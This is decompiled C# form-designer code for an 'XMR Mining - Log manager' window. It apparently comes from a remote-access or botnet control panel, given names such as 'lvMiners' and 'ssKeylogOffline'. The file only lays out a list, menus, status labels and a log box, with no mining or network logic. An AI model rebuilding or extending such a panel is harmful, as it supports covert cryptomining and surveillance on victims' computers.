﻿// Token: 0x020000FD RID: 253
[global::Microsoft.VisualBasic.CompilerServices.DesignerGenerated]
public sealed partial class fMinerXMRLogManager : global::System.Windows.Forms.Form
{
	// Token: 0x06000D31 RID: 3377 RVA: 0x0006667C File Offset: 0x0006487C
	[global::System.Diagnostics.DebuggerNonUserCode]
	protected override void Dispose(bool disposing)
	{
		try
		{
			if (disposing && this.icontainer_0 != null)
			{
				this.icontainer_0.Dispose();
			}
		}
		finally
		{
			base.Dispose(disposing);
		}
	}

	// Token: 0x06000D32 RID: 3378 RVA: 0x000666BC File Offset: 0x000648BC
	[global::System.Diagnostics.DebuggerStepThrough]
	private void InitializeComponent()
	{
		this.icontainer_0 = new global::System.ComponentModel.Container();
		this.vmethod_1(new global::GClass7());
		this.vmethod_15(new global::System.Windows.Forms.ContextMenuStrip(this.icontainer_0));
		this.vmethod_17(new global::System.Windows.Forms.ToolStripMenuItem());
		this.vmethod_19(new global::System.Windows.Forms.ToolStripMenuItem());
		this.vmethod_21(new global::System.Windows.Forms.ToolStripSeparator());
		this.vmethod_23(new global::System.Windows.Forms.ToolStripMenuItem());
		this.vmethod_25(new global::System.Windows.Forms.ToolStripSeparator());
		this.vmethod_27(new global::System.Windows.Forms.ToolStripMenuItem());
		this.vmethod_29(new global::System.Windows.Forms.ToolStripMenuItem());
		this.vmethod_31(new global::System.Windows.Forms.ToolStripSeparator());
		this.vmethod_33(new global::System.Windows.Forms.ToolStripMenuItem());
		this.vmethod_3(new global::System.Windows.Forms.StatusStrip());
		this.vmethod_5(new global::System.Windows.Forms.ToolStripStatusLabel());
		this.vmethod_13(new global::System.Windows.Forms.ToolStripStatusLabel());
		this.vmethod_7(new global::System.Windows.Forms.ToolStripStatusLabel());
		this.vmethod_9(new global::System.Windows.Forms.RichTextBox());
		this.vmethod_11(new global::System.Windows.Forms.Timer(this.icontainer_0));
		this.vmethod_14().SuspendLayout();
		this.vmethod_2().SuspendLayout();
		base.SuspendLayout();
		this.vmethod_0().Alignment = global::System.Windows.Forms.ListViewAlignment.Left;
		this.vmethod_0().Anchor = (global::System.Windows.Forms.AnchorStyles.Top | global::System.Windows.Forms.AnchorStyles.Bottom | global::System.Windows.Forms.AnchorStyles.Left);
		this.vmethod_0().AutoArrange = false;
		this.vmethod_0().BackColor = global::System.Drawing.Color.White;
		this.vmethod_0().ContextMenuStrip = this.vmethod_14();
		this.vmethod_0().Font = new global::System.Drawing.Font("Microsoft Sans Serif", 8.142858f, global::System.Drawing.FontStyle.Regular, global::System.Drawing.GraphicsUnit.Point, 0);
		this.vmethod_0().ForeColor = global::System.Drawing.Color.Black;
		this.vmethod_0().FullRowSelect = true;
		this.vmethod_0().HeaderStyle = global::System.Windows.Forms.ColumnHeaderStyle.Nonclickable;
		this.vmethod_0().HideSelection = false;
		this.vmethod_0().Location = new global::System.Drawing.Point(0, 0);
		this.vmethod_0().Margin = new global::System.Windows.Forms.Padding(1);
		this.vmethod_0().Name = "lvMiners";
		this.vmethod_0().Size = new global::System.Drawing.Size(205, 456);
		this.vmethod_0().TabIndex = 35;
		this.vmethod_0().TabStop = false;
		this.vmethod_0().UseCompatibleStateImageBehavior = false;
		this.vmethod_0().View = global::System.Windows.Forms.View.Details;
		this.vmethod_14().ImageScalingSize = new global::System.Drawing.Size(24, 24);
		this.vmethod_14().Items.AddRange(new global::System.Windows.Forms.ToolStripItem[]
		{
			this.vmethod_16(),
			this.vmethod_24(),
			this.vmethod_26()
		});
		this.vmethod_14().Name = "ContextMenuStrip1";
		this.vmethod_14().Size = new global::System.Drawing.Size(102, 54);
		this.vmethod_16().DropDownItems.AddRange(new global::System.Windows.Forms.ToolStripItem[]
		{
			this.vmethod_18(),
			this.vmethod_20(),
			this.vmethod_22()
		});
		this.vmethod_16().Name = "LogStripMenuItem1";
		this.vmethod_16().Size = new global::System.Drawing.Size(101, 22);
		this.vmethod_16().Text = "Log";
		this.vmethod_18().Name = "ViewToolStripMenuItem";
		this.vmethod_18().Size = new global::System.Drawing.Size(162, 22);
		this.vmethod_18().Text = "View";
		this.vmethod_20().Name = "ToolStripMenuItem3";
		this.vmethod_20().Size = new global::System.Drawing.Size(159, 6);
		this.vmethod_22().Name = "UpdateAndViewToolStripMenuItem";
		this.vmethod_22().Size = new global::System.Drawing.Size(162, 22);
		this.vmethod_22().Text = "Update and view";
		this.vmethod_24().Name = "ToolStripMenuItem1";
		this.vmethod_24().Size = new global::System.Drawing.Size(98, 6);
		this.vmethod_26().DropDownItems.AddRange(new global::System.Windows.Forms.ToolStripItem[]
		{
			this.vmethod_28(),
			this.vmethod_30(),
			this.vmethod_32()
		});
		this.vmethod_26().Name = "ClearToolStripMenuItem";
		this.vmethod_26().Size = new global::System.Drawing.Size(101, 22);
		this.vmethod_26().Text = "Clear";
		this.vmethod_28().Name = "AllToolStripMenuItem";
		this.vmethod_28().Size = new global::System.Drawing.Size(118, 22);
		this.vmethod_28().Text = "All";
		this.vmethod_30().Name = "ToolStripMenuItem2";
		this.vmethod_30().Size = new global::System.Drawing.Size(115, 6);
		this.vmethod_32().Name = "SelectedToolStripMenuItem";
		this.vmethod_32().Size = new global::System.Drawing.Size(118, 22);
		this.vmethod_32().Text = "Selected";
		this.vmethod_2().AutoSize = false;
		this.vmethod_2().BackColor = global::System.Drawing.Color.FromArgb(235, 237, 239);
		this.vmethod_2().ImageScalingSize = new global::System.Drawing.Size(28, 28);
		this.vmethod_2().Items.AddRange(new global::System.Windows.Forms.ToolStripItem[]
		{
			this.vmethod_4(),
			this.vmethod_12(),
			this.vmethod_6()
		});
		this.vmethod_2().Location = new global::System.Drawing.Point(0, 457);
		this.vmethod_2().Name = "ssKeylogOffline";
		this.vmethod_2().Padding = new global::System.Windows.Forms.Padding(1, 0, 7, 0);
		this.vmethod_2().Size = new global::System.Drawing.Size(903, 19);
		this.vmethod_2().SizingGrip = false;
		this.vmethod_2().Stretch = false;
		this.vmethod_2().TabIndex = 34;
		this.vmethod_2().Text = "stStatus";
		this.vmethod_4().AutoSize = false;
		this.vmethod_4().BorderSides = global::System.Windows.Forms.ToolStripStatusLabelBorderSides.All;
		this.vmethod_4().BorderStyle = global::System.Windows.Forms.Border3DStyle.SunkenOuter;
		this.vmethod_4().Margin = new global::System.Windows.Forms.Padding(0, 3, 0, 0);
		this.vmethod_4().Name = "tsLogs";
		this.vmethod_4().Size = new global::System.Drawing.Size(305, 16);
		this.vmethod_4().Text = "Logs: N/A";
		this.vmethod_4().TextAlign = global::System.Drawing.ContentAlignment.TopLeft;
		this.vmethod_12().AutoSize = false;
		this.vmethod_12().BorderSides = global::System.Windows.Forms.ToolStripStatusLabelBorderSides.All;
		this.vmethod_12().BorderStyle = global::System.Windows.Forms.Border3DStyle.SunkenOuter;
		this.vmethod_12().Margin = new global::System.Windows.Forms.Padding(0, 3, 0, 0);
		this.vmethod_12().Name = "tsLogUser";
		this.vmethod_12().Size = new global::System.Drawing.Size(396, 16);
		this.vmethod_12().Spring = true;
		this.vmethod_12().Text = "Current log: N/A";
		this.vmethod_12().TextAlign = global::System.Drawing.ContentAlignment.TopLeft;
		this.vmethod_6().AutoSize = false;
		this.vmethod_6().BorderSides = global::System.Windows.Forms.ToolStripStatusLabelBorderSides.All;
		this.vmethod_6().BorderStyle = global::System.Windows.Forms.Border3DStyle.SunkenOuter;
		this.vmethod_6().Font = new global::System.Drawing.Font("Segoe UI", 9f);
		this.vmethod_6().Margin = new global::System.Windows.Forms.Padding(0, 3, -6, 0);
		this.vmethod_6().Name = "tsLogSize";
		this.vmethod_6().Size = new global::System.Drawing.Size(200, 16);
		this.vmethod_6().Text = "Log size: N/A";
		this.vmethod_6().TextAlign = global::System.Drawing.ContentAlignment.TopLeft;
		this.vmethod_8().Anchor = (global::System.Windows.Forms.AnchorStyles.Top | global::System.Windows.Forms.AnchorStyles.Bottom | global::System.Windows.Forms.AnchorStyles.Left | global::System.Windows.Forms.AnchorStyles.Right);
		this.vmethod_8().Location = new global::System.Drawing.Point(207, 0);
		this.vmethod_8().Margin = new global::System.Windows.Forms.Padding(2);
		this.vmethod_8().Name = "rtLogs";
		this.vmethod_8().ScrollBars = global::System.Windows.Forms.RichTextBoxScrollBars.Vertical;
		this.vmethod_8().Size = new global::System.Drawing.Size(695, 456);
		this.vmethod_8().TabIndex = 32;
		this.vmethod_8().Text = string.Empty;
		this.vmethod_10().Enabled = true;
		this.vmethod_10().Interval = 1000;
		base.AutoScaleDimensions = new global::System.Drawing.SizeF(6f, 13f);
		base.AutoScaleMode = global::System.Windows.Forms.AutoScaleMode.Font;
		base.ClientSize = new global::System.Drawing.Size(903, 476);
		base.Controls.Add(this.vmethod_0());
		base.Controls.Add(this.vmethod_2());
		base.Controls.Add(this.vmethod_8());
		this.DoubleBuffered = true;
		base.Margin = new global::System.Windows.Forms.Padding(2);
		base.Name = "fMinerXMRLogManager";
		base.Opacity = 0.0;
		base.ShowIcon = false;
		base.ShowInTaskbar = false;
		base.StartPosition = global::System.Windows.Forms.FormStartPosition.CenterParent;
		this.Text = "XMR Mining - Log manager";
		this.vmethod_14().ResumeLayout(false);
		this.vmethod_2().ResumeLayout(false);
		this.vmethod_2().PerformLayout();
		base.ResumeLayout(false);
	}

	// Token: 0x0400054F RID: 1359
	private global::System.ComponentModel.IContainer icontainer_0;
}
